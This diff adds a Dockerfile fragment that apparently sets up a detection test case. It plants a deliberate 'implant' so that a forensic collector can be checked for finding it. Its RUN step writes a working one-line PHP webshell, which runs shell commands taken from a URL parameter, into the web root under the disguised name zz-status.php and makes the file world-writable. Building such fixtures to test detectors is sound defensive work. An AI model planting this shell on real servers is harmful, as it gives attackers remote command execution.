@@ -1,0 +1,9 @@
+# APT2 implant: apt2-webshell (webshell under DocumentRoot). Drops a PHP
+# webshell in /var/www/html. webroot collects it (content_sha256 + the
+# world_writable/recent_mtime co-indicators) -- signal-only by design (non-
+# package floods on web content), so it is surfaced by LFA singleton-ness +
+# the co-indicators, NOT a Q7 detection. World-writable to raise the
+# co-indicator. Variables: (none)
+RUN mkdir -p /var/www/html && \
+    printf '%s\n' '<?php system($_GET["c"]); ?>' > /var/www/html/zz-status.php && \
+    chown root:root /var/www/html/zz-status.php && chmod 0666 /var/www/html/zz-status.php
